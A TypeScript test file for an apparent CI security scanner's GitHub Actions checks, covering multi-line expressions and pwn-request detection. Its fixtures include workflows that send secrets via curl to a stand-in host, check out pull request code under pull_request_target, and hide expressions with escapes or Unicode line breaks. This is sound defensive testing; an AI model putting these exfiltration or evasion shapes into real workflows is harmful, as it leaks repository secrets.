/**
 * `${{ }}` expressions across lines (src/checks/workflows.ts, expressionSpans): an expression runs from its `${{` to
 * the first `}}` outside a string literal, on its own line or a later one, and every check reads it whole, joined to
 * the lines it takes in, reporting at the line it starts on. Only a `${{` with no `}}` within 50 lines, or an
 * expression a YAML escape wrote part of, makes the file WS-SC-900 high, once per file, in scan and diff alike.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { checkWorkflow } from "../src/checks/workflows.js";
import { fx, testCtx } from "./helpers.js";
import { cli, gitRepo } from "./validation-helpers.js";

const wf = (text: string) => checkWorkflow(".github/workflows/x.yml", text, testCtx());
const job = (steps: string, head = "on: pull_request_target\n") => `${head}jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;
/** Each finding as `rule severity line`, the line `-` for a finding about the whole file. */
const found = (text: string) => wf(text).map((f) => `${f.ruleId} ${f.severity} ${f.line ?? "-"}`);
/** The WS-SC-900 findings: severity, then the part of the message that says why. */
const unread = (text: string) =>
  wf(text)
    .filter((f) => f.ruleId === "WS-SC-900")
    .map((f) => `${f.severity} ${/ was not checked: (.*?), so wormsign cannot read what GitHub evaluates there/.exec(f.message)?.[1] ?? f.message}`);
const UNCLOSED = (lines: string) => `high a \${{ }} expression has no closing }} within 50 lines (it starts on ${lines})`;
const ESCAPED = (lines: string) => `high a \${{ }} expression is written with YAML escape sequences (${lines})`;

test("multi-line expressions: the reviewer's secrets dump over two lines or three, in every scalar style, is WS-GH-002 high at its first line", () => {
  // A SecOps review's reproduction: scan reported nothing and diff only WS-DF-003 medium.
  const reported = job('      - env:\n          X: >-\n            ${{ toJSON(\n            secrets) }}\n        run: curl -d "$X" https://a.invalid\n');
  assert.deepEqual(found(reported), ["WS-GH-002 high 8"]);
  assert.match(wf(reported)[0]?.message ?? "", /^Serializes the entire secrets context with toJSON\(secrets\)$/);
  // Three lines, the braces on lines of their own: one finding, though toJSON(secrets) alone on line 9 matches as well.
  assert.deepEqual(found(job('      - env:\n          X: >-\n            ${{\n              toJSON(secrets)\n            }}\n        run: curl -d "$X" https://a.invalid\n')), ["WS-GH-002 high 8"]);
  // The dump, and secrets.* read by a function, split in folded and literal block scalars (with chomping and
  // indentation indicators), and in plain, double-quoted and single-quoted scalars that continue on the next lines.
  const env = (x: string) => job(`      - run: node build.js\n        env:\n${x}`);
  for (const [expr, message] of [
    ["toJSON(\n            secrets)", /^Serializes the entire secrets context/],
    ["join(\n            secrets.*,\n            ' ')", /^Reads the secrets context other than as secrets\.NAME/],
  ] as const) {
    for (const head of [">", ">-", ">+", "|", "|-", "|+", "|2"]) {
      const t = env(`          X: ${head}\n            \${{ ${expr} }}\n`);
      assert.deepEqual(found(t), ["WS-GH-002 high 9"], `${head} ${expr}`);
      assert.match(wf(t)[0]?.message ?? "", message);
    }
    // In a single-quoted scalar a quote is written '' (YAML 1.2, 7.3.2).
    for (const [open, close, e] of [["", "", expr], ['"', '"', expr], ["'", "'", expr.replaceAll("'", "''")]]) {
      const t = env(`          X: ${open}\${{ ${e} }}${close}\n`);
      assert.deepEqual(found(t), ["WS-GH-002 high 8"], `${open}scalar${close} ${expr}`);
    }
  }
});

test("multi-line expressions: every check reads an expression split across lines as it reads it on one line", () => {
  // [rule, the expression on one line, the same expression split across lines, the line it starts on]
  const forms: [string, string, string, number][] = [
    ["WS-GH-005", job('      - run: curl -d "${{ secrets.NPM_TOKEN }}" https://a.invalid\n'), job('      - run: curl -d "${{\n          secrets.NPM_TOKEN\n          }}" https://a.invalid\n'), 6],
    // The sink after the expression, on the line that closes it.
    ["WS-GH-005", job("      - run: echo ${{ secrets.T }} > out.txt\n"), job("      - run: echo ${{\n          secrets.T }} > out.txt\n"), 6],
    // A secret bound in env: by an expression split across lines, then used by a network command.
    ["WS-GH-005", job('      - run: curl -d "$T" https://a.invalid\n        env:\n          T: ${{ secrets.T }}\n'), job('      - run: curl -d "$T" https://a.invalid\n        env:\n          T: ${{\n            secrets.T }}\n'), 6],
    ["WS-GH-002", job("      - run: echo '${{ toJSON(secrets) }}' > s.json\n"), job("      - run: echo '${{ toJSON(\n          secrets) }}' > s.json\n"), 6],
    ["WS-GH-002", job("      - run: echo ${{ join(secrets.*, ' ') }} > s\n"), job("      - run: echo ${{ join(\n          secrets.*, ' ') }} > s\n"), 6],
    ["WS-GH-003", job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"), job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{\n            github.event.pull_request.head.sha }}\n"), 8],
    ["WS-GH-003", job("      - run: |\n          git fetch origin ${{ github.head_ref }}\n"), job("      - run: |\n          git fetch origin ${{\n            github.head_ref }}\n"), 7],
    ["WS-GH-003", job("      - run: git fetch origin ${{ github.event.workflow_run.head_sha }}\n", "on: workflow_run\n"), job("      - run: git fetch origin ${{\n          github.event.workflow_run.head_sha }}\n", "on: workflow_run\n"), 6],
    ["WS-GH-004", "on: push\njobs:\n  a:\n    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - run: x\n", "on: push\njobs:\n  a:\n    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ${{\n      matrix.os }}\n    steps:\n      - run: x\n", 7],
  ];
  for (const [rule, one, split, line] of forms) {
    assert.ok(wf(one).some((f) => f.ruleId === rule), `positive control: ${rule} reads ${JSON.stringify(one)}`);
    assert.deepEqual(unread(split), [], `${rule} split is read: ${JSON.stringify(split)}`);
    assert.deepEqual(
      wf(split)
        .filter((f) => f.ruleId === rule)
        .map((f) => f.line),
      [line],
      `${rule} split: ${JSON.stringify(split)}`,
    );
  }
});

test("multi-line expressions: legitimate multi-line conditions and values, as next.js writes them, are clean", () => {
  // The shapes of next.js's workflows at its pinned commit in the false-positive corpus, which WS-SC-900 reported
  // while each expression was read only on one line. workflow_run is a privileged trigger, and the run step names the
  // head SHA without fetching it.
  const nextjs = [
    "on:",
    "  workflow_run:",
    "    workflows: ['build-and-deploy']",
    "    types: [completed]",
    "jobs:",
    "  a:",
    "    if: >-",
    "      ${{ ",
    "        github.event.workflow_run.conclusion == 'failure' &&",
    "        github.event.workflow_run.run_attempt < 3",
    "      }}",
    "    outputs:",
    "      turbopack-only: >-",
    "        ${{",
    "          github.event_name == 'pull_request' &&",
    "          steps.turbopack-change.outputs.TURBOPACK_ONLY != 'false'",
    "        }}",
    "      rspack: >-",
    "        ${{",
    "          steps.is-release.outputs.IS_RELEASE == 'true' || (",
    "            contains(github.event.pull_request.labels.*.name, 'Rspack')",
    "          )",
    "        }}",
    "    runs-on: ubuntu-latest",
    "    steps:",
    '      - run: node scripts/upload.js "${{',
    '          github.event.workflow_run.head_sha }}" "${{ runner.temp',
    '          }}/tarballs"',
    "      - run: |",
    "          # e2e and ${{ inputs.test_type }} tests",
    "          export NEXT_TEST_MODE=${{",
    "            inputs.test_type == 'development' && 'dev' || 'start'",
    "          }}",
    "          export ${{",
    "            inputs.test_type == 'development' &&",
    "              'TURBOPACK_DEV=1' ||",
    "              'TURBOPACK_BUILD=1'",
    "          }}",
    "",
  ].join("\n");
  assert.deepEqual(found(nextjs), []);
  assert.deepEqual(found("on: push\njobs:\n  a:\n    if: ${{\n      github.event_name == 'push'\n    }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"), []);
});

test("multi-line expressions: a ${{ with no closing }} within 50 lines is WS-SC-900 high, and one within 50 lines is read", () => {
  // No `}}` in the file at all.
  assert.deepEqual(unread(job("      - run: echo ${{ github.sha\n      - run: echo hi\n")), [UNCLOSED("line 6")]);
  const f = wf(job("      - run: echo ${{ github.sha\n"));
  assert.match(
    f[0]?.message ?? "",
    /^\.github\/workflows\/x\.yml was not checked: a \$\{\{ \}\} expression has no closing \}\} within 50 lines \(it starts on line 6\), so wormsign cannot read what GitHub evaluates there: a secret or pull request code it uses was not checked\. Close each expression with \}\} within 50 lines, and write it without escapes$/,
  );
  assert.equal(f[0]?.line, undefined, "the finding is for the file");
  // An expression of 51 lines is not read; one of 50 lines is, and what it holds is reported at its first line.
  const lines = (n: number, body: string) => job(`      - run: |\n          echo \${{\n${"            github.sha\n".repeat(n - 3)}            ${body}\n          }}\n`);
  assert.deepEqual(unread(lines(51, "github.sha")), [UNCLOSED("line 7")]);
  assert.deepEqual(found(lines(50, "github.sha")), []);
  assert.deepEqual(found(lines(50, "toJSON(secrets)")), ["WS-GH-002 high 7"]);
  // A `}}` past the bound does not close it, and the lines after the bound are read on their own.
  assert.deepEqual(found(job(`      - run: |\n          echo \${{ github.sha\n${"          echo x\n".repeat(60)}          echo }} \${{ toJSON(secrets) }}\n`)), ["WS-SC-900 high -", "WS-GH-002 high 68"]);
  // In a block scalar a `#` is content, which GitHub reads: a `${{` there with no `}}` is not closed.
  assert.deepEqual(unread(job("      - run: |\n          # pass ${{ secrets.X here\n          echo hi\n")), [UNCLOSED("line 7")]);
});

test("multi-line expressions: a ${{ in a YAML comment, which GitHub ignores, is never unclosed and joins no lines", () => {
  // A review's report: a comment with an unclosed `${{` was WS-SC-900 high. Only a reading as YAML reads the lines, with
  // the comments gone, can find an expression unclosed.
  assert.deepEqual(found(job("      # TODO: pass ${{ secrets.NPM_TOKEN here once\n      - run: echo hi\n")), []);
  assert.deepEqual(found(job("      - run: echo hi # pass ${{ secrets.X here\n")), []);
  assert.deepEqual(found("# ${{ toJSON(\non: push\njobs:\n  a:\n    runs-on: x\n    steps:\n      - run: echo hi\n"), []);
  // Read as written, the comment's `${{` stays open to the 50-line bound; it must not take in the lines below it, or the
  // step's curl would be read with the comment's secrets and reported at the comment's line.
  assert.deepEqual(found(job("      # TODO: pass ${{ secrets.NPM_TOKEN here once\n      - run: curl -d x https://a.invalid\n")), []);
  // Controls: the same `${{` in a value, quoted or plain, is unclosed. A step after the comment is still read; a `}}` that
  // closes the comment's `${{` as written still joins the comment to the lines up to it (the reader may have mistaken
  // where a comment starts), which can only add a finding at the comment's line.
  assert.deepEqual(unread(job('      - run: "echo ${{ secrets.X here"\n')), [UNCLOSED("line 6")]);
  assert.deepEqual(unread(job("      - run: echo ${{ secrets.X here\n")), [UNCLOSED("line 6")]);
  assert.deepEqual(found(job("      # TODO: pass ${{ secrets.NPM_TOKEN here once\n      - run: curl -d ${{ secrets.T }} https://a.invalid\n")), ["WS-GH-005 high 6", "WS-GH-005 high 7"]);
});

test("expression lexing: a }} in a string literal does not end the expression a secret is read in (WS-GH-005)", () => {
  // A review's five cases, which reported nothing: the secret read after a literal holding `}}`, on one line or across
  // lines, in plain, literal and folded scalars.
  const sink = (expr: string, head = "      - run: ") => job(`${head}curl -d "\${{ ${expr} }}" https://a.invalid\n`);
  assert.deepEqual(found(sink("secrets.TOKEN")), ["WS-GH-005 high 6"], "positive control");
  for (const [what, t, line] of [
    ["}} first in a format string", sink("format('}}{0}', secrets.TOKEN)"), 6],
    ["}} last in a format string", sink("format('{0}}}', secrets.TOKEN)"), 6],
    ["a literal that spans the line break", job("      - run: |\n          curl -d \"${{ format('{0}\n          }}', secrets.TOKEN) }}\" https://a.invalid\n"), 7],
    ["the secret on the next line", job("      - run: |\n          curl -d \"${{ format('}}{0}',\n          secrets.TOKEN) }}\" https://a.invalid\n"), 7],
    ["a '}}' operand in a folded scalar", job("      - run: >\n          curl -d \"${{ github.sha == 'x' &&\n          '}}' || secrets.TOKEN }}\" https://a.invalid\n"), 7],
  ] as const) {
    assert.deepEqual(found(t), [`WS-GH-005 high ${line}`], what);
  }
  // A secret bound in env: after such a literal, then used by a network command.
  assert.deepEqual(found(job("      - run: curl -d \"$T\" https://a.invalid\n        env:\n          T: ${{ format('}}{0}', secrets.T) }}\n")), ["WS-GH-005 high 6"]);
  // Control: the word secrets inside a literal after the `}}` is still text in the literal, and a closed expression ends.
  assert.deepEqual(found(sink("format('}}{0}', github.sha)")), []);
});

test("expression lexing: property paths are read as GitHub's lexer reads them, whitespace and case aside", () => {
  // actions/runner's LexicalAnalyzer skips whitespace between tokens, and a `.` after a name dereferences it; context
  // keys are looked up case-insensitively. A review's case: `github.event.pull_request` then `.head.sha` on the next line.
  const ref = (value: string) => job(`      - uses: actions/checkout@v4\n        with:\n          ref: ${value}\n      - run: npm test\n`);
  for (const value of [
    "${{ github.event.pull_request\n            .head.sha }}",
    "${{ github.event['pull_request']\n            ['head']['sha'] }}",
    "${{ github . event . pull_request . head . sha }}",
    "${{ github [ 'event' ] [ 'pull_request' ] [ 'head' ] . sha }}",
    "${{ GITHUB.EVENT.PULL_REQUEST.HEAD.SHA }}",
    "${{ github.event['PULL_REQUEST'].Head.Sha }}",
    "${{ github.event.pull_request\u00a0.head.sha }}",
    "${{ github.HEAD_REF }}",
  ]) {
    assert.deepEqual(found(ref(value)), ["WS-GH-003 high 8"], value);
  }
  // In a git fetch, split before the `.`.
  assert.deepEqual(found(job("      - run: git fetch origin ${{ github.event.pull_request\n          .head.ref }}\n")), ["WS-GH-003 high 6"]);
  // Controls: the base ref, a name that only contains the path, and a literal that holds it are not the head.
  for (const value of ["${{ github.event.pull_request . base.sha }}", "${{ github.event.pull_request.headless }}", "${{ inputs.ref }}"]) {
    assert.deepEqual(found(ref(value)), [], value);
  }
  // The secrets context in any case and with whitespace, on one line or split.
  for (const expr of ["SECRETS.TOKEN", "Secrets . TOKEN", "secrets\n          .TOKEN", "secrets [ 'TOKEN' ]"]) {
    assert.deepEqual(found(job(`      - run: |\n          curl -d "\${{ ${expr} }}" https://a.invalid\n`)), ["WS-GH-005 high 7"], expr);
  }
  // A matrix value split before its `.` picks the runner too.
  const matrix = (runsOn: string) => `on: push\njobs:\n  a:\n    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ${runsOn}\n    steps:\n      - run: x\n`;
  for (const v of ["${{ matrix\n      .os }}", "${{ MATRIX.os }}", "${{ matrix['os'] }}"]) assert.deepEqual(found(matrix(v)), ["WS-GH-004 medium 7"], v);
});

test("expression lexing: a ref written below its key, as a block scalar or on the next line, is read as the key's value", () => {
  const ref = (value: string) => job(`      - uses: actions/checkout@v4\n        with:\n          ref:${value}\n`);
  for (const value of [" >-\n            ${{ github.event.pull_request.head.sha }}", " |\n            ${{ github.head_ref }}", "\n            ${{ github.event.pull_request.head.sha }}"]) {
    assert.deepEqual(found(ref(value)), ["WS-GH-003 high 9"], value);
  }
  assert.deepEqual(found(job("      - uses: actions/checkout@v4\n        with:\n          repository: >-\n            ${{ github.event.pull_request.head.repo.full_name }}\n")), ["WS-GH-003 high 9"]);
  // Control: another key's block scalar that names the head ref is not a checkout.
  assert.deepEqual(found(job("      - uses: actions/github-script@v7\n        with:\n          script: >-\n            ${{ github.event.pull_request.head.sha }}\n")), []);
});

test("pwn-request shapes: a head ref through an env: variable, or a ref computed from the github context, is WS-GH-003", () => {
  // A round-2 review's cases, which gave nothing: the meaning of the head ref, not its spelling.
  const steps = (s: string, head = "on: pull_request_target\n") => job(s, head);
  const bound = (name: string, value = "${{ github.event.pull_request.head.sha }}") => `        env:\n          ${name}: ${value}\n`;
  const positives: [string, string, number | number[]][] = [
    ["env: then ref: ${{ env.SHA }}", steps(`      - uses: actions/checkout@v4\n${bound("SHA")}        with:\n          ref: \${{ env.SHA }}\n`), 10],
    ["a workflow-level env: and a lower-case env.sha", `on: pull_request_target\nenv:\n  SHA: \${{ github.head_ref }}\n${job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ env['sha'] }}\n", "")}`, 10],
    ["repository: from env:", steps(`      - uses: actions/checkout@v4\n${bound("REPO", "${{ github.event.pull_request.head.repo.full_name }}")}        with:\n          repository: \${{ env.REPO }}\n`), 10],
    ["git fetch \"$SHA\" and git checkout FETCH_HEAD", steps(`      - run: git fetch origin "$SHA" && git checkout FETCH_HEAD\n${bound("SHA")}`), 6],
    ["git checkout ${SHA} in a block", steps(`      - run: |\n          git checkout \${SHA}\n${bound("SHA", "${{ github.event.workflow_run.head_sha }}")}`, "on: workflow_run\n"), 7],
    ["git switch and git reset", steps(`      - run: |\n          git switch --detach "$SHA"\n          git reset --hard $SHA\n${bound("SHA")}`), [7, 8]],
    ["${{ env.SHA }} in a git fetch", steps(`      - run: git fetch origin \${{ env.SHA }}\n${bound("SHA")}`), 6],
    ["fromJSON(toJSON(github.event))", steps("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ fromJSON(toJSON(github.event)).pull_request.head.sha }}\n"), 8],
    ["a computed index", steps("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event[format('{0}', 'pull_request')].head.sha }}\n"), 8],
    ["toJSON(github) in a block scalar ref", steps("      - uses: actions/checkout@v4\n        with:\n          ref: >-\n            ${{ fromJson(toJson(github)).event.pull_request.head.sha }}\n"), 9],
  ];
  for (const [what, t, lines] of positives) assert.deepEqual(found(t), [lines].flat().map((n) => `WS-GH-003 high ${n}`), what);
  const computed = wf(positives[7]![1])[0]?.message ?? "";
  assert.equal(computed, "pull_request_target workflow checks out a ref computed from the github context (through toJSON, fromJSON or a computed index), which wormsign cannot resolve: it may be pull request code, run with access to secrets");
  assert.equal(wf(positives[0]![1])[0]?.message, "pull_request_target workflow checks out pull request code, running it with access to secrets");
  // Controls: an env name bound to the base sha, a ref of github.sha, the head sha only echoed or logged, a debug dump
  // of the event, a computed value from outside the github context, and the same shapes under push.
  const negatives: [string, string][] = [
    ["env: bound to the base sha", steps(`      - run: git fetch origin "$BASE"\n${bound("BASE", "${{ github.event.pull_request.base.sha }}")}      - uses: actions/checkout@v4\n        with:\n          ref: \${{ env.BASE }}\n`)],
    ["ref: github.sha", steps("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.sha }}\n")],
    ["ref: github['sha'], a literal index", steps("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github['sha'] }}\n")],
    ["the head sha echoed, logged or shown", steps(`      - run: |\n          echo "$SHA"\n          git log -1 "$SHA"\n          git show --stat \${SHA}\n${bound("SHA")}`)],
    ["toJSON(github.event) in a run line", steps("      - run: echo '${{ toJSON(github.event) }}'\n      - run: echo '${{ github.event[format('{0}', 'action')] }}'\n")],
    ["fromJSON of a step output", steps("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ fromJSON(steps.meta.outputs.json).sha }}\n")],
    ["under push", steps(`      - uses: actions/checkout@v4\n${bound("SHA")}        with:\n          ref: \${{ fromJSON(toJSON(github.event)).pull_request.head.sha }}\n      - run: git fetch origin "$SHA"\n`, "on: push\n")],
  ];
  for (const [what, t] of negatives) assert.deepEqual(found(t), [], what);
});

test("workflow reader: U+0085, U+2028 and U+2029, line breaks to YamlDotNet, make the file WS-SC-900 high, naming each", () => {
  // A review's case: a step after a U+2028 in a comment is a step to YamlDotNet, and was read as part of the comment.
  const at = (c: string) => job(`      - run: echo hi # note${c}      - run: curl -d \${{ secrets.TOKEN }} https://a.invalid\n`);
  for (const [c, name] of [["\x85", "U+0085 (NEXT LINE)"], ["\u2028", "U+2028 (LINE SEPARATOR)"], ["\u2029", "U+2029 (PARAGRAPH SEPARATOR)"]] as const) {
    const f = wf(at(c));
    assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity} ${x.line ?? "-"}`), ["WS-SC-900 high -"], name);
    assert.equal(
      f[0]?.message,
      `.github/workflows/x.yml was not checked: it holds ${name} on line 6, which YamlDotNet, the YAML library of GitHub's runner, reads as a line break and wormsign's workflow reader does not, so GitHub may end a comment or value there and read what follows as a step that was not checked. Remove the character, or in a double-quoted string write it as an escape (\\x85, \\u2028 or \\u2029)`,
    );
  }
  // Each character is named once, at its first line; the finding is keyed on the file's content.
  const all = wf(job("      - run: echo \u2029\n      - run: echo \x85 \u2028 \x85\n"));
  assert.match(all[0]?.message ?? "", /it holds U\+0085 \(NEXT LINE\) on line 7, U\+2028 \(LINE SEPARATOR\) on line 7, U\+2029 \(PARAGRAPH SEPARATOR\) on line 6, which/);
  const fp = (t: string) => wf(t).find((x) => x.ruleId === "WS-SC-900")?.fingerprint;
  assert.notEqual(fp(at("\u2028")), fp(at("\u2028").replace("TOKEN", "OTHER")));
  // Controls: written as a YAML escape, the character is not in the file; no such character, no finding.
  assert.deepEqual(found(job('      - run: "echo \\u2028 \\L \\N"\n')), []);
  assert.deepEqual(found(job("      - run: echo hi\n")), []);
});

test("multi-line expressions: an expression a YAML escape wrote part of is WS-SC-900 high, on one line or several", () => {
  for (const e of ["\\x24{{ secrets.T }}", "$\\x7b{ secrets.T }}", "${{ \\x73ecrets.T }}", "${{ \\u0073ecrets.T }}", "${{ \\U00000073ecrets.T }}", "${{ toJSON(\\nsecrets) }}", "${{ toJSON(\\ secrets) }}"]) {
    assert.deepEqual(unread(job(`      - run: "curl -d ${e} https://a.invalid"\n`)), [ESCAPED("line 6")], e);
  }
  // An escape that writes the closing `}}`. As written the expression is not closed either, but only a `${{` as YAML
  // reads it can be unclosed (one in a comment is text GitHub ignores), and as YAML reads it the escape closes it.
  assert.deepEqual(unread(job('      - run: "curl -d ${{ secrets.T \\x7d} https://a.invalid"\n')), [ESCAPED("line 6")]);
  // Across lines: an escape on a later line of the expression, an escaped line break inside one, and one after `$` or
  // `${`, which YAML joins to the next line's `{{` or `{` with no space between.
  for (const e of ["${{ toJSON(\n          \\x73ecrets) }}", "${{ secrets.\\\n          T }}", "$\\\n          {{ secrets.T }}", "${\\\n          { secrets.T }}", "${{ format(\\x27}}\\x27, toJSON(\n          secrets)) }}"]) {
    assert.deepEqual(unread(job(`      - run: "curl -d ${e} https://a.invalid"\n`)), [ESCAPED("line 6")], e);
  }
  // Both kinds in one file: one finding that says both. Five lines named at most.
  assert.deepEqual(unread(job('      - run: "echo \\x24{{ secrets.T }}"\n      - run: echo ${{ github.sha\n')), [`${UNCLOSED("line 7")}, and ${ESCAPED("line 6").replace(/^high /, "")}`]);
  assert.deepEqual(unread(job('      - run: "echo \\x24{{ github.sha }}"\n'.repeat(7))), [ESCAPED("lines 6, 7, 8, 9, 10, and 2 more")]);
  // Escapes outside an expression, and \\, \" and \/ inside one (characters an expression gives no meaning), are read
  // as YAML reads them: the line is checked, the escape decoded.
  assert.deepEqual(unread(job('      - run: "echo \\"${{ github.sha }}\\"\\n\\tdone \\x27x\\x27"\n')), []);
  assert.deepEqual(unread(job('      - run: "echo ${{ hashFiles(\'a\\\\b\', \'c\\/d\') }}"\n')), []);
  assert.deepEqual(found(job('      - run: "\\x63url -d ${{ secrets.T }} https://a.invalid"\n')), ["WS-GH-005 high 6"]);
  // An escape past U+10FFFF is not a character; it must not stop the check.
  assert.deepEqual(unread(job('      - run: "echo \\UFFFFFFFF ${{ github.sha }}"\n')), []);
  assert.deepEqual(unread(job('      - run: "echo ${{ \\UFFFFFFFF github.sha }}"\n')), [ESCAPED("line 6")]);
});

test("multi-line expressions: string literals, quotes and comments cannot cut an expression short or hide its text", () => {
  // A `}}` in a GitHub string literal does not end the expression, on one line or several.
  assert.deepEqual(found(job("      - run: echo ${{ format('}}', toJSON(\n          secrets)) }}\n")), ["WS-GH-002 high 6"]);
  // In a single-quoted YAML scalar '' is one quote: as written, ''}}'' looks like the end; as YAML reads it, it is a
  // string literal. Both readings are checked, across two lines and on one.
  assert.deepEqual(found(job("      - run: 'echo ${{ format(''}}'', toJSON(\n          secrets)) }}'\n")), ["WS-GH-002 high 6"]);
  assert.deepEqual(found(job("      - run: 'echo ${{ format(''}}'', join(\n          secrets.*, '' '')) }}'\n")), ["WS-GH-002 high 6"]);
  assert.deepEqual(found(job("      - run: '${{ format(''}}'', join(secrets.*, '' '')) }}'\n")), ["WS-GH-002 high 6"]);
  // In a block scalar `#` is content, and GitHub reads the expression through it.
  assert.deepEqual(found(job('      - run: |\n          curl -d "${{ # x\n            secrets.T }}" https://a.invalid\n')), ["WS-GH-005 high 7"]);
  // Where the reader takes `#` for a comment, the lines are read with and without it: neither text after it, nor a
  // `}}` in it, nor a quote in it hides the expression.
  const whole = wf(job("      - run: echo ${{ toJSON( # x secrets\n          ) }}\n"));
  assert.deepEqual(whole.map((f) => `${f.ruleId} ${f.line}`), ["WS-GH-002 6"]);
  assert.match(whole[0]?.message ?? "", /^Reads the secrets context other than/);
  assert.deepEqual(found(job("      - run: echo ${{ fromJSON( # x\n          toJSON(secrets)) }}\n")), ["WS-GH-002 high 6"]);
  assert.deepEqual(found(job("      - run: echo ${{ toJSON( # x\n          secrets) }}\n")), ["WS-GH-002 high 6"]);
  assert.deepEqual(found(job("      - run: echo ${{ toJSON( # }}\n          secrets) }}\n")), ["WS-GH-002 high 6"]);
  assert.ok(found(job("      - run: echo ${{ toJSON( # it's\n          secrets) }} 'x'\n")).includes("WS-GH-002 high 6"));
});

test("multi-line expressions: one finding per expression and rule, at the line its ${{ is on", () => {
  // An expression that starts on the line another one ends on is reported at its own line.
  assert.deepEqual(found(job("      - run: |\n          echo ${{\n            github.sha }} ${{ toJSON(\n            secrets) }}\n")), ["WS-GH-002 high 8"]);
  // A line inside an expression that holds an expression of its own keeps its own findings.
  assert.deepEqual(found(job("      - run: |\n          echo ${{ toJSON(\n            secrets) }}; echo ${{ toJSON(secrets) }}\n")), ["WS-GH-002 high 7", "WS-GH-002 high 8"]);
  // Two rules on one expression's lines are both reported.
  assert.deepEqual(found(job("      - run: |\n          echo ${{ toJSON(\n            secrets) }} ${{ secrets.T }} > out\n")), ["WS-GH-002 high 7", "WS-GH-005 high 7", "WS-GH-005 high 8"]);
});

test("multi-line expressions: a finding's key digests the lines its expression takes in; WS-SC-900's digests the file", () => {
  const fp = (t: string, rule: string) => wf(t).find((f) => f.ruleId === rule)?.fingerprint;
  const a = job("      - run: curl -d ${{\n          secrets.A }} https://a.invalid\n");
  assert.ok(fp(a, "WS-GH-005"));
  // Moving the lines keeps the key; editing the line the expression continues on changes it.
  assert.equal(fp(`# a comment\n${a}`, "WS-GH-005"), fp(a, "WS-GH-005"));
  assert.notEqual(fp(a.replace("secrets.A", "secrets.B"), "WS-GH-005"), fp(a, "WS-GH-005"));
  const u = job("      - run: curl -d ${{\n          secrets.A https://a.invalid\n");
  assert.ok(fp(u, "WS-SC-900"));
  assert.notEqual(fp(u.replace("secrets.A", "secrets.B"), "WS-SC-900"), fp(u, "WS-SC-900"));
});

test("scan and diff: a workflow with a split secrets dump and a local action with an unclosed expression fail the default gate", async () => {
  const iocs = ["--iocs", fx("iocs"), "--no-baseline"];
  const action = (env: string) => `name: a\nruns:\n  using: composite\n  steps:\n    - shell: bash\n${env}      run: curl -d "$X" https://a.invalid\n`;
  const nextjs = "on: push\njobs:\n  a:\n    if: >-\n      ${{\n        github.event_name == 'push'\n      }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
  const repo = gitRepo([
    (d) => {
      mkdirSync(join(d, ".github", "workflows"), { recursive: true });
      writeFileSync(join(d, ".github", "workflows", "ci.yml"), job("      - run: echo hi\n", "on: push\n"));
      writeFileSync(join(d, "action.yml"), action(""));
    },
    (d) => {
      writeFileSync(join(d, ".github", "workflows", "ci.yml"), job('      - env:\n          X: >-\n            ${{ toJSON(\n            secrets) }}\n        run: curl -d "$X" https://a.invalid\n', "on: push\n"));
      writeFileSync(join(d, ".github", "workflows", "next.yml"), nextjs);
      writeFileSync(join(d, "action.yml"), action("      env:\n        X: >-\n          ${{ toJSON(\n          github)\n"));
    },
  ]);
  const diff = await cli(["diff", "HEAD~1", "HEAD", "--dir", repo, ...iocs]);
  assert.equal(diff.code, 1);
  assert.deepEqual(diff.findings.map((f) => `${f.ruleId} ${f.severity} ${f.file}`).sort(), [
    "WS-DF-003 medium .github/workflows/ci.yml",
    "WS-DF-003 medium .github/workflows/next.yml",
    "WS-DF-003 medium action.yml",
    "WS-GH-002 high .github/workflows/ci.yml",
    "WS-SC-900 high action.yml",
  ]);
  const scan = await cli(["scan", repo, ...iocs]);
  assert.equal(scan.code, 1);
  assert.deepEqual(scan.findings.map((f) => `${f.ruleId} ${f.severity} ${f.file}:${f.line}`), ["WS-GH-002 high .github/workflows/ci.yml:8"]);
});

test("scan and diff: a pull request adding a split head-ref checkout and a secret sent past a '}}' literal fails the default gate", async () => {
  // A review's full-gate reproduction: diff and scan exited 0, with WS-DF-003 medium only.
  const iocs = ["--iocs", fx("iocs"), "--no-baseline"];
  const repo = gitRepo([
    (d) => writeFileSync(join(d, "README.md"), "app\n"),
    (d) => {
      mkdirSync(join(d, ".github", "workflows"), { recursive: true });
      writeFileSync(join(d, ".github", "workflows", "prt.yml"), job("      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request\n            .head.sha }}\n"));
      writeFileSync(join(d, ".github", "workflows", "exfil.yml"), job("      - run: |\n          curl -d \"${{ format('{0}\n          }}', secrets.TOKEN) }}\" https://a.invalid\n", "on: push\n"));
    },
  ]);
  const diff = await cli(["diff", "HEAD~1", "HEAD", "--dir", repo, ...iocs]);
  assert.equal(diff.code, 1);
  assert.deepEqual(diff.findings.map((f) => `${f.ruleId} ${f.severity} ${f.file}`).sort(), [
    "WS-DF-003 medium .github/workflows/exfil.yml",
    "WS-DF-003 medium .github/workflows/prt.yml",
    "WS-GH-003 high .github/workflows/prt.yml",
    "WS-GH-005 high .github/workflows/exfil.yml",
  ]);
  const scan = await cli(["scan", repo, ...iocs]);
  assert.equal(scan.code, 1);
  assert.deepEqual(scan.findings.map((f) => `${f.ruleId} ${f.severity} ${f.file}:${f.line}`).sort(), ["WS-GH-003 high .github/workflows/prt.yml:8", "WS-GH-005 high .github/workflows/exfil.yml:7"]);
});

/** As in workflows.test.ts: linear work takes well under a second; quadratic work on these inputs takes minutes. */
const LIMIT_MS = 5000 * (Number(process.env["WORMSIGN_PERF_FACTOR"]) || 1);

